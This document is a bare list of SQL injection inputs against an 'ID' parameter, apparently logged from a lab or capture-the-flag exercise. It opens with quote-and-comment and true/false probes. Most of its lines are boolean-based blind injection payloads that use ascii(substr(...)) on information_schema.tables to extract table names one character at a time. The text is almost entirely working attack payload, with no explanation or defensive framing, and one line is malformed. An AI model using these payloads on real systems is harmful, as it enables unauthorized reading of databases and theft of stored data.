ID:5
ID:1
ID:1'-- 
ID:1'and 1=1-- 
ID:1'and 1=1;-- 
ID:1'and 1=2;-- 
ID:-1'and 1=1;-- 
ID:-1'or 1=1;-- 
ID:-1'or ascii(substr((length database()),1,1))>50;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),21,1))=94;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),21,1))=37;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),24,1))=90;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),21,1))=125;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),21,1))=35;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),21,1))=38;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=48;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=77;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=65;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=97;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=109;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=49;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=78;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=66;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=98;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=110;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=50;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=79;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=67;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=99;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=111;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=51;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=80;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=68;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=100;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=112;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=52;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=81;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=69;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=101;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=113;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=53;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=82;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=70;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=102;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=114;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=54;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=83;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=71;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=103;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=115;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=55;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=84;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=72;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=104;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=116;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=56;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=85;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=73;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=105;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=117;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=57;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=86;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=74;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=106;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=118;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=95;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=87;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=75;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=107;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=119;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=45;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=88;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=76;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=108;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=120;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=91;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=89;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=42;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=123;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=121;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=93;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),25,1))=90;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=40;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=44;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=122;-- 
ID:-1'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),22,1))=36;-- 
